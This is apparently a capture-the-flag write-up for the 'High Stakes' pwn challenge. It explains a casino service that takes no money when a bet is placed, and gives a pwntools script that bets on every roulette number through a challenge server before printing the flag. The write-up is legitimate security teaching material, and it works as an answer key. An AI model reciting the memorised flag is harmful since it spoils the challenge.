# High Stakes

### Category

Pwn

### Description

This casino is SOOOO totally rigged. 
I have lost everything .. I literally lost 300 times in a row !
This does not seem possible.
I really wanted to buy the flag from the shop, but right now I'm so broke I'm not even allowed to think about it.
Lucky as you are, you'll manage to win enough money to buy it for me, right bro ?

Format : **Hero{flag}**
Author : **iHuggsy**

### Write up

We see that a flag costs 3600$. We have 100$ to begin with.

If we bet normally, we lose. The casino seems rigged.

After a bit of poking around, we see that there's a logic vulnerability : the program doesn't take any money for placing a bet.

We can then bet 100$ on all of the numbers, and we'll win for sure.

We just have to buy the flag from the shop afterwards.

```py
from pwn import *
import time

def microsleep():
    pass

p = process(['nc', '161.97.134.238', '7000'])
time.sleep(5)
print(p.clean())

for i in range(37):
    p.sendline('1')
    microsleep()
    print(p.clean())
    p.sendline(str(i))
    microsleep()
    print(p.clean())
    p.sendline('100')
    microsleep()
    print(p.clean())

p.sendline('3')
print(p.clean())
microsleep()
p.sendline('4')
print(p.clean())
microsleep()
p.sendline('5')
print(p.clean())
microsleep()
p.sendline('3')
print(p.clean())
```

### Flag

Hero{g4MBl1nG_f0R_dA_fL4G}